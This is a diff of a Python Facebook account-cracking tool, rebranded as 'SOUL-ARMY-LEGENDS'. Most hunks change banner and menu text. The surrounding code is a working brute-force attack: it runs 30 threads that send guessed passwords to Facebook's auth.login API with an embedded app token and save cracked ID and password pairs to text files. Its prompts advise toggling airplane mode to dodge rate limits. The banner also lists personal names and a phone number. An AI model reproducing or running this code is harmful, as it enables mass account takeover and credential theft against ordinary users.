@@ -1,4 +1,4 @@
- W = '\033[97;1m'
+W = '\033[97;1m' 
  R = '\033[91;1m' 
  G = '\033[92;1m' 
  Y = '\033[93;1m' 
@@ -115,11 +115,11 @@
                  sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01) 
  ############### #LOGO############## ##  
    
- # LOG IN
+ # LOGIN 
  def Public(): 
          clear() 
          print(logo) 
-         print  (' [01] Login With Token\n [02] Login With Cookie') 
+         print  (' [01] LOG IN WITH TOKEN\n [02] LOG IN WITH COOKIE') 
          pil=input('\n [#] Select One : ') 
          if pil in ['1','01']: 
                  panda = input(' [+] Token : ') 
@@ -228,7 +228,7 @@
                   
  def first(): 
          clear() 
-         print(logo);print( '\n\033[1;94m [!] HACKING START..... pls wait for IDs\n\033[1;96m [!] Turn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n') 
+         print(logo);print( '\n\033[1;94m [!] CLONING HAS START \n\033[1;96m [!] IF NO RESULTS TURN ON AIRPLANE MODE FOR 3MIN THEN TURN IT OFF\033[1;0m\n') 
          with tred(max_workers=30) as pool: 
                  for yuzong in id2: 
                          idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower() 
@@ -275,7 +275,7 @@
                                  pass 
  def name2(): 
          clear() 
-         print(logo);print( '\n [!] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [!] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc)) 
+         print(logo);print( '\n [!] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [!] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n [!] \033[1;96mIF NO RESULTS TURN ON AIRPLANE MODE FOR 3MIN THEN TURN IT OFF\033[1;0m\n'%(okc,cpc)) 
          with tred(max_workers=30) as pool: 
                  for yuzong in id2: 
                          idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower() 
@@ -369,7 +369,7 @@
                          elif "c_user" in ses.cookies.get_dict().keys(): 
                                  coki=po.cookies.get_dict() 
                                  coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]) 
-                                 print(f'\r\x1b[1;92m [SHAH-NOOR-OK] {idf} * {pw}') 
+                                 print(f'\r\x1b[1;92m [SOUL-ARMY-LEGENDS-OK] {idf} * {pw}') 
                                  wrt =('%s - %s' % (idf,pw)) 
                                  ok.append(wrt) 
                                  open('/sdcard/SOUL-ARMY-LEGENDS-OK','a').write('%s\n' % wrt) 
@@ -390,23 +390,24 @@
  logo = """ 
   
   
- ,404040404040404040404040  
- 404040404040404040404040
- `404040404040404040404040  
-  `404040404040404040404040  
-    404040404040404040404040  
- \__404040404040404040404040  
+ █▀ ▄▄ ▄▀█ ▄▄ █░░
+ 
+ ▄█ ░░ █▀█ ░░ █▄▄
+  SOUL-ARMY-LEGENDS
+ ==============================
+ ==============================  
                                              
   
- \x1b[1;97m------------------------------------------------------- 
+ \x1b[1;78m------------------------------------------------------- 
  \33[1;41m𝗧𝗢𝗢𝗟𝗦 𝗨𝗣𝗗𝗔𝗧𝗘 𝗙𝗜𝗥𝗦𝗧 𝗦𝗘𝗡𝗧 𝗙𝗥𝗜𝗘𝗡𝗗 𝗥𝗘𝗤𝗨𝗘𝗦𝗧 \33[0m 
  \033[1;97m••••••••••••••••••••••••••••••••••••••••••••••  
- \x1b[1;90m[+] 𝗔𝗨𝗧𝗛𝗢𝗥  :   BR4IT0N-UMUT-KRD-ADIVAR      
- \x1b[1;91m[+] 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞 :  MAVIS ZOTHI RIKHOTSO 
- \x1b[1;92m[+] 𝗚𝗜𝗧𝗛𝗨𝗕  :   BRAITON-KARADAG
- \x1b[1;93m[+] 𝗧𝗘𝗔𝗠    :   \33[1;42 SOUL-AMRY-LEGENDS \33[0m 
- \x1b[1;94m[+] 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 :\x1b[1;97m  1.0.3    \x1b[1;97m           
- \033[1;97m••••••••••••••••••••••••••••••••••••••••••••••  
+ \x1b[1;90m[+] 𝗔𝗨𝗧𝗛𝗢𝗥     :   BRAITON - UMUT KARADAG - ADIVAR     
+ \x1b[1;91m[+] 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞   :  MAVIS ZOTHI RIKHOTSO 
+ \x1b[1;92m[+] 𝗚𝗜𝗧𝗛𝗨𝗕      :   BRAITON-KARADAG
+ \x1b[1;98m[+] 𝗪𝗛𝗔𝗧𝗦'𝗔𝗣𝗣  : +27649325296
+ \x1b[1;93m[+] 𝗧𝗘𝗔𝗠        :   \33[1;42  SOUL-ARMY-LEGENDS\33[0m 
+ \x1b[1;94m[+] 𝗩𝗘𝗥𝗦𝗜𝗢𝗡     :\x1b[1;97m  1.0.3    \x1b[1;97m           
+ \033[1;80m••••••••••••••••••••••••••••••••••••••••••••••  
  """ 
    
  class Main: 
@@ -419,12 +420,12 @@
                  print(logo) 
                  print("") 
                  print("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -") 
-                 print("\033[1;37mNOTE : APPROVAL K LIYE FACEBOOK PR FOLLOW KR DEN") 
+                 print("\033[1;37mNOTE : FOLLOW MY FACEBOOK ACCOUNT FOR APPROVAL") 
                  print("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ") 
                   
                   
                  print("") 
-                 print("\033[1;37m [1] First Send Friend Request  ") 
+                 print("\033[1;37m [1] FIRST SEND FRIEND REQUEST  ") 
                  print("\033[1;37m [2] EXIT") 
                  print("") 
                  Baloch = input("\n\033[1;37m  Choose : \033[1;32m") 
@@ -442,7 +443,7 @@
                          input("\n\033[1;37m TYPE THE OWNER FACEBOOK ACCOUNT NAME \033[1;37m") 
                          time.sleep(3.1) 
                          print("") 
-                         print("\033[1;32m WELCOME TO SOUL-AMRY-LEGENDS TOOL") 
+                         print("\033[1;32m WELCOME TO SOUL-ARMY-LEGENDS TOOLS") 
                          time.sleep(3.0) 
                          os.system("clear") 
                  print(logo) 
@@ -450,9 +451,9 @@
                  print("\033[1;37m- - - - - - - - - - - - - - - - - - - - - - - - - - -") 
                  print(" \033[1;32m[1]\033[0;92m FILE CLONING ") 
                  print(" \033[1;32m[2] PUBLIC CLONING") 
-                 print(" \33[1;32m[3] PAK RANDOM CLONING") 
-                 print(" \033[1;32m[4] 2006 To 2012 ") 
-                 print(" \33[1;32m[5] 2004 To 2008 ") 
+                 print(" \33[1;32m[3] PAKISTAN RANDOM CLONING") 
+                 print(" \033[1;32m[4] 2006 TO 2012 ") 
+                 print(" \33[1;32m[5] 2004 TO 2008 ") 
                  print("\033[1;32m [E] Exit \n") 
                  UZAIR =input(" \033[1;32mCHOOSE : ") 
                  if UZAIR in ["1", "01"]: 
@@ -460,7 +461,7 @@
                  if UZAIR in ["2", "02"]: 
                          Public() 
                  if UZAIR in ["3", "03"]: 
-                         os.system("python2 mrd1.py") 
+                         os.system("python2 mrd1.py") 
                  if UZAIR in ["4", "04"]: 
                          self.old() 
                  if UZAIR in ["5", "05"]: 
@@ -485,23 +486,23 @@
                           
                          print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id)))  
                          with ThreadPoolExecutor(max_workers=30) as coeg: 
-                                 print("\n\033[1;32m [!] Ex(123456) FOR Old IDZ\033[1;37m ") 
+                                 print("\n\033[1;32m [!] Ex(123456) FOR OLD ACCOUNTS\033[1;37m ") 
                                  listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y)) 
                                  if len(listpass)<=5: 
                                          exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B)) 
                                  print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass)) 
                                  os.system("clear") 
                                  print(logo) 
-                                 print("     \033[0;93m   Premium Mode  Activated") 
-                                 print("\n\033[0;94m [+] BRUTE HAS BEEN STARTED") 
+                                 print("     \033[0;93m   PREMIUM MODE ACTIVATED ") 
+                                 print("\n\033[0;94m [+] CLONING HAS BEEN STARTED") 
                                  print(" \033[0;96m[+] Note : 70% CP Account'S Open Just Now") 
-                                 print(" [!] IF NO RESULTS TURN ON AIRPLANE MODE FOR 5MINS THEN TURN IT OFF") 
-                                 print("\033[0;94m-----------------------------------------------------------") 
+                                 print(" [!] IF NO RESULTS TURN ON AIRPLANE MODE FOR 3MIN THEN TURN IT OFF") 
+                                 print("\033[0;94m------------------------------------------------") 
                                  print("\n") 
                                  print("\033[1;37m") 
                                  for user in self.id: 
                                          coeg.submit(self.api, user, listpass.split(",")) 
-                         exit("\n\n \033[1;37m>>[PROCESS COMPLETE... \n\033[0;92m >>[THANKS FOR USING SOUL-ARMY-LEGENDS TOOL") 
+                         exit("\n\n \033[1;37m>>[PROCESS COMPLETE... \n\033[0;92m >>[THANKS FOR USING THIS TOOL...") 
                  except Exception as e:exit(str(e)) 
    
          def api(self, uid, pwx): 
@@ -887,13 +888,13 @@
                          } 
                          response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers)  
                          if "session_key" in response.text and "EAAA" in response.text: 
-                                 print("\r \033[1;32m[SHAH-NOOR-OK]%s | %s\033[1;32m         "%(uid, pw)) 
+                                 print("\r \033[1;32m[SOUL-ARMY-LEGENDS-OK]%s | %s\033[1;32m         "%(uid, pw)) 
                                  print ("\r \033[1;32m Congrats ") 
                                  self.ok.append("%s|%s"%(uid, pw)) 
-                                 open("SHAH-NOOR-OK.txt","a").write(" %s|%s\n"%(uid, pw)) 
+                                 open("SOUL-ARMY-LEGENDS-OK.txt","a").write(" %s|%s\n"%(uid, pw)) 
                                  break 
                          elif "www.facebook.com" in response.json()["error_msg"]: 
-                                 print("\r \033[1;32m[SHAH-NOOR-OK] %s | %s\033[1;32m         "%(uid, pw)) 
+                                 print("\r \033[1;32m[SOUL-ARMY-LEGENDS-OK] %s | %s\033[1;32m         "%(uid, pw)) 
                                  self.cp.append("%s|%s"%(uid, pw)) 
                                  open("SOUL-ARMY-LEGENDS-OK.txt","a").write(" %s | %s\n"%(uid, pw)) 
                                  break 
@@ -916,18 +917,18 @@
                           
                          print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id)))  
                          with ThreadPoolExecutor(max_workers=30) as coeg: 
-                                 print("\n\033[1;32m [!] Ex(123456) FOR Old IDZ\033[1;37m ") 
+                                 print("\n\033[1;32m [!] Ex(123456) FOR OLD ACCOUNTS\033[1;37m ") 
                                  listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y)) 
                                  if len(listpass)<=5: 
                                          exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B)) 
                                  print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass)) 
                                  os.system("clear") 
                                  print(logo) 
-                                 print("     \033[0;93m   Premium Mode  Activated") 
+                                 print("     \033[0;93m   PREMIUM MODE ACTIVATED") 
                                  print("\n\033[0;94m [+] BRUTE HAS BEEN STARTED") 
-                                 print(" \033[0;96m[+] Note : 70% CP Account'S Open Just Now") 
-                                 print(" [!] IF NO RESULTS TURN ON AIRPLANE MODE FOR 5MINS THEN TURN IT OFF") 
-                                 print("\033[0;94m-----------------------------------------------------------") 
+                                 print(" \033[0;96m[+] Note : 70% ACCOUNT CP WILL OPEN NOW") 
+                                 print(" [!] IF NO RESULTS TURN ON AIRPLANE MODE FOR 3MIN THEN TURN IT OFF") 
+                                 print("\033[0;94m------------------------------------------------") 
                                  print("\n") 
                                  print("\033[1;37m") 
                                  for user in self.id: 
@@ -1318,13 +1319,13 @@
                          } 
                          response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers)  
                          if "session_key" in response.text and "EAAA" in response.text: 
-                                 print("\r \033[1;32m[SOUL-AMRY-LEGENDS-OK] %s | %s\033[0;32m         "%(uid, pw)) 
+                                 print("\r \033[1;32m[SOUL-ARMY-LEGENDS-OK] %s | %s\033[0;32m         "%(uid, pw)) 
                                  print ("\r \033[1;32m Congrats ") 
                                  self.ok.append("%s|%s"%(uid, pw)) 
-                                 open("SOUL-ARMY-LEGENDS.txt","a").write(" %s|%s\n"%(uid, pw)) 
+                                 open("SOUL-ARMY-LEGENDS-OK.txt","a").write(" %s|%s\n"%(uid, pw)) 
                                  break 
                          elif "www.facebook.com" in response.json()["error_msg"]: 
-                                 print("\r \033[1;32m[OK] %s | %s\033[1;32m         "%(uid, pw)) 
+                                 print("\r \033[1;32m[SOUL-ARMY-LEGENDS-OK] %s | %s\033[1;32m         "%(uid, pw)) 
                                  self.cp.append("%s|%s"%(uid, pw)) 
                                  open("Successfull.txt","a").write(" %s | %s\n"%(uid, pw)) 
                                  break 
